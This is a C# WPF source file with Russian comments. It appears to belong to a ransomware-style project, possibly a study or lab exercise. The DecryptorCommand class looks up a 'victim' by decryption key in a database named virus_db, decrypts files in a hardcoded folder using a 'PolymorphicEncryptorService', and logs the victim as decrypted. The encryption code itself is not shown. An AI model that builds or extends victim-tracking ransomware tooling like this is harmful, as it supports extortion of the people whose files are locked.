using System;
using System.Linq;
using System.Windows;
using CP.Services;

namespace CP.Commands
{
    public class DecryptorCommand
    {
        public void Execute(string decryptionKey)
        {
            try
            {
                var encryptor = new PolymorphicEncryptorService();
                var victimService = new VictimManagerService();
                var logger = new ActivityLoggerService();

                using (var context = new virus_dbEntities2())  // ← ИСПРАВЛЕНО!
                {
                    // Находим жертву по ключу
                    var victim = context.victims  // ← строчная буква!
                        .FirstOrDefault(v => v.encryption_key == decryptionKey);  // ← строчная!

                    if (victim == null)
                    {
                        MessageBox.Show("Неверный ключ дешифровки!", "Ошибка",
                                      MessageBoxButton.OK, MessageBoxImage.Error);
                        return;
                    }

                    // Дешифруем файлы
                    string targetDirectory = @"C:\Users\admin\Desktop\files";
                    int decryptedCount = 0;

                    if (System.IO.Directory.Exists(targetDirectory))
                    {
                        decryptedCount = encryptor.DecryptVictimFiles(targetDirectory, decryptionKey);
                    }

                    // Обновляем статус
                    victimService.MarkAsDecrypted(victim, decryptedCount);
                    victim.status = "decrypted";  // ← прям здесь меняем
                    context.SaveChanges();

                    // Логируем активность - используем victim.victim_id (int)
                    logger.LogDecryptionActivity(victim.victim_id, decryptedCount);

                    MessageBox.Show($"Расшифровано {decryptedCount} файлов.",
                                  "Дешифрование завершено", MessageBoxButton.OK, MessageBoxImage.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка дешифрования: {ex.Message}", "Ошибка",
                              MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }
}